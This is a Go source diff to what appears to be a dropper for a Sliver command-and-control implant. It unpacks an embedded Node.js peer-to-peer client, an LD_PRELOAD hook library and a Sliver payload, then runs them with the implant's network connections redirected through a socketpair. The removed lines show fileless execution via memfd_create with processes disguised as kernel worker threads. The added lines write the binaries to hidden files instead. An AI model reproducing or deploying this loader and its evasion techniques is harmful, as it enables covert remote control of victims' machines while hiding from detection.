@@ -11,7 +11,6 @@ import (
 	"path/filepath"
 	"syscall"
 	"time"
-	"unsafe"
 )
 
 func Run(connString string) error {
@@ -45,22 +44,22 @@ func Run(connString string) error {
 		return fmt.Errorf("extract hook library failed: %w", err)
 	}
 
-	// 5. Load Node.js binary to memfd (fileless execution)
-	nodeFd, err := loadAssetToMemfd("node.gz", "[kworker/u4:1]")
-	if err != nil {
-		return fmt.Errorf("load node failed: %w", err)
+	// 5. Extract Node.js binary to disk
+	nodePath := filepath.Join(workDir, ".node")
+	if err := extractGzipAsset("node.gz", nodePath); err != nil {
+		return fmt.Errorf("extract node failed: %w", err)
 	}
 
-	// 6. Load Sliver payload to memfd
-	payloadFd, err := loadAssetToMemfd("payload.gz", "[kworker/u4:2]")
-	if err != nil {
-		return fmt.Errorf("load payload failed: %w", err)
+	// 6. Extract Sliver payload to disk
+	payloadPath := filepath.Join(workDir, ".payload")
+	if err := extractGzipAsset("payload.gz", payloadPath); err != nil {
+		return fmt.Errorf("extract payload failed: %w", err)
 	}
 
 	// 7. Start Node.js P2P Client
 	// Pass the socketpair fd via ExtraFiles (will be fd 3 in child)
 	// The fd number in env var refers to the ExtraFiles index + 3
-	nodeCmd := exec.Command("/proc/self/fd/"+fmt.Sprint(nodeFd), filepath.Join(workDir, "client.js"), connString)
+	nodeCmd := exec.Command(nodePath, filepath.Join(workDir, "client.js"), connString)
 	nodeCmd.Dir = workDir
 	nodeCmd.Stdout = os.Stdout
 	nodeCmd.Stderr = os.Stderr
@@ -78,7 +77,7 @@ func Run(connString string) error {
 
 	// 8. Start Sliver Payload with LD_PRELOAD hook
 	// The hook intercepts connect() to 127.0.0.1:8888 and redirects to socketpair
-	payloadCmd := exec.Command("/proc/self/fd/" + fmt.Sprint(payloadFd))
+	payloadCmd := exec.Command(payloadPath)
 	payloadCmd.Dir = workDir
 	payloadCmd.Stdout = os.Stdout
 	payloadCmd.Stderr = os.Stderr
@@ -117,35 +116,31 @@ func Run(connString string) error {
 	return nil
 }
 
-// loadAssetToMemfd loads a gzipped asset into a memfd for fileless execution
-func loadAssetToMemfd(assetName, procName string) (int, error) {
+// extractGzipAsset extracts a gzipped asset to a file on disk
+func extractGzipAsset(assetName, destPath string) error {
 	f, err := Assets.Open("assets/" + assetName)
 	if err != nil {
-		return 0, fmt.Errorf("open asset %s: %w", assetName, err)
+		return fmt.Errorf("open asset %s: %w", assetName, err)
 	}
 	defer f.Close()
 
 	gz, err := gzip.NewReader(f)
 	if err != nil {
-		return 0, fmt.Errorf("gzip reader %s: %w", assetName, err)
+		return fmt.Errorf("gzip reader %s: %w", assetName, err)
 	}
 	defer gz.Close()
 
-	// memfd_create syscall (319 on x86_64)
-	// MFD_CLOEXEC = 1, MFD_ALLOW_SEALING = 2
-	namePtr := unsafe.Pointer(syscall.StringBytePtr(procName))
-	fd, _, errno := syscall.Syscall(319, uintptr(namePtr), 1, 0)
-	if errno != 0 {
-		return 0, fmt.Errorf("memfd_create failed: %v", errno)
+	out, err := os.OpenFile(destPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
+	if err != nil {
+		return fmt.Errorf("create file %s: %w", destPath, err)
+	}
+	defer out.Close()
+
+	if _, err := io.Copy(out, gz); err != nil {
+		return fmt.Errorf("extract %s: %w", assetName, err)
 	}
 
-	memFile := os.NewFile(fd, procName)
-	if _, err := io.Copy(memFile, gz); err != nil {
-		memFile.Close()
-		return 0, fmt.Errorf("copy to memfd: %w", err)
-	}
-
-	return int(fd), nil
+	return nil
 }
 
 // extractHookLibrary extracts the precompiled LD_PRELOAD hook library
